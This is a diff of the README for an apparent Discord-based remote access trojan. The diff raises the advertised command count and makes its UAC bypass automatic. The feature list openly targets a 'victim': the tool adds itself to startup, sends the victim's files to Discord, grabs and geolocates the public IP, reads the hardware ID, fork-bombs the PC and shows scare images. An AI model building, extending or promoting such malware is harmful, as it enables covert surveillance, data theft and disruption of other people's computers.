@@ -12,7 +12,7 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 
 
 # FEATURES
-**20+ COMMANDS**
+**30+ COMMANDS**
 **ADDS TO STARTUP**
 
 **NOTE : MAKE SURE TO EXTRACT THE FOLDER**
@@ -27,7 +27,7 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 6. !download ( file path ) -- Sends file to discord
 7. !tts message -- Plays a message on victims screen
 8. !ip -- Grab victims PUBLIC IP and geolocates it.
-9. **UAC BYPASS**
+9. **UAC BYPASSES AUTOMATICALLY**
 10. !forkbomb -- SPAMS NOTEPAD 1000 TIMES, FORK BOMBING THE PC 
 11. !hwid -- Takes the victims HWID
 12. !jumpscare -- Shows the image scarylarry.png on  their screen
